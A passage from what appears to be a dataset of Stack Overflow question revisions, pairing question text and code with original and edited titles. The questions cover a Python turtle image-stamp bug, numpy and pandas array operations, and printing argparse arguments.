'.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Python turtle stamp disappearing after turtle shape's image manipulation," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Python turtle stamp mysteriously disappearing after turtle shape's image manipulation," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
Find all combinations that sum to N with multiple lists," Given: m number of lists (m can vary).Each list contain arange() of numbers.Want:Find the m-tuple (one number per list) that sum() to N.What I have:I can find all combination in a static number of lists. I would also like to find an optimal way to compute this as well. <code>  import numpy as npfor a in np.arange(0,1,0.01): for b in np.arange(0,1,0.01): for c in np.arange(0,1,0.01): for d in np.arange(0,1,0.01): if (a+b+c+d) == 1.0: print a,b,c,d",Find all combination that sum to N with multiple lists
Find all permutations that sum to N with multiple lists," Given: m number of lists (m can vary).Each list contain arange() of numbers.Want:Find the m-tuple (one number per list) that sum() to N.What I have:I can find all combination in a static number of lists. I would also like to find an optimal way to compute this as well. <code>  import numpy as npfor a in np.arange(0,1,0.01): for b in np.arange(0,1,0.01): for c in np.arange(0,1,0.01): for d in np.arange(0,1,0.01): if (a+b+c+d) == 1.0: print a,b,c,d",Find all combination that sum to N with multiple lists
Print command line arguements with argparse?," I am using argparse to parse command line arguments.To aid debugging, I would like to print a line with the arguments which with the Python script was called. Is there a simple way to do this within argparse? <code> ",Print command line arguments with argparse?
"vectorial ""and"" for pandas columns"," With a data like this one (but with 40e3 columns)I look for a vectorized way to put the boolean and in a result Series: For now I only get an ugly solution with a for loop:: with the B.M. answer I get this We can probably avoid this new for loop. <code>  import pandas as pdtcd = pd.DataFrame({ 'a': {'p_1': 1, 'p_2': 1, 'p_3': 0, 'p_4': 0}, 'b': {'p_1': 0, 'p_2': 1, 'p_3': 1, 'p_4': 1}, 'c': {'p_1': 0, 'p_2': 0, 'p_3': 1, 'p_4': 0}})tcd# a b c# p_1 1 0 0# p_2 1 1 0# p_3 0 1 1# p_4 0 1 0 a & b = ab -> 1 or True a & c = ac -> 0 or False1 0 0 1 0 01 1 0 1 0 00 1 1 0 1 00 1 0 0 0 0 res = pd.Series(index=['a&a', 'a&b', 'a&c'])for i in range(3): res[i] = (tcd.iloc[:, 0] & tcd.iloc[:, i]).any()res aa 1ab 1ac 0 def get_shared_p(tcd, i): res = (tcd.iloc[:, i][:, None] & tcd).any() res.index += '&_{}'.format(i) return resres = pd.DataFrame(columns=range(cols), index=range(cols))for col_i in range(cols): res.iloc[:, col_i] = list(get_shared_p(tcd, col_i))print res# 0 1 2# 0 True True False# 1 True True True# 2 False True True","Vectorized ""and"" for pandas columns"
Merge 2 arrays vertical to tuple Numpy," I have two numpy arrays: Is there a way to merge these arrays together like tupples: <code>  x = np.array([-1, 0, 1, 2])y = np.array([-2, -1, 0, 1]) array = [(-1, -2), (0, -1), (1, 0), (2, 1)]",Merge two arrays vertically to array of tuples using numpy
